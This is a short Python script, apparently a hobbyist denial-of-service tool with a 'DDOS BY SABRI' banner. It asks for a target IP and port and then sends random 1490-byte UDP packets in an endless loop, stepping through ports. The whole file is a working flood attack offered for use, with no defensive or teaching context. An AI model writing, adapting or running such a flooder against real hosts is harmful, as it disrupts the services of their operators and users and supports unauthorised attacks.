# -*- coding: utf-8 -*-
import os
import time
import socket
import random
from datetime import datetime
from colorama import init, Fore

init()  # Initialiser colorama

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
def clear_line():
    # Utilise la séquence d'échappement ANSI pour effacer la ligne courante dans le terminal iSH
    print("\033[2K", end="\r")
print(Fore.LIGHTMAGENTA_EX + '''
██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ██╗   ██╗    ███████╗ █████╗ ██████╗ ██████╗ ██╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝    ██╔════╝██╔══██╗██╔══██╗██╔══██╗██║
██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝ ╚████╔╝     ███████╗███████║██████╔╝██████╔╝██║
██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██╗  ╚██╔╝      ╚════██║██╔══██║██╔══██╗██╔══██╗██║
██████╔╝██████╔╝╚██████╔╝███████║    ██████╔╝   ██║       ███████║██║  ██║██████╔╝██║  ██║██║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═════╝    ╚═╝       ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝
Author : sabri_goat''')
                                                                                            
ip = input(Fore.LIGHTMAGENTA_EX + "IP Target: ")
port = int(input("Port: "))
time.sleep(7)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print(Fore.LIGHTMAGENTA_EX + "Sent {} packet{} through port: {}".format(sent, ip, port))
    if port == 65534:
        port = 1
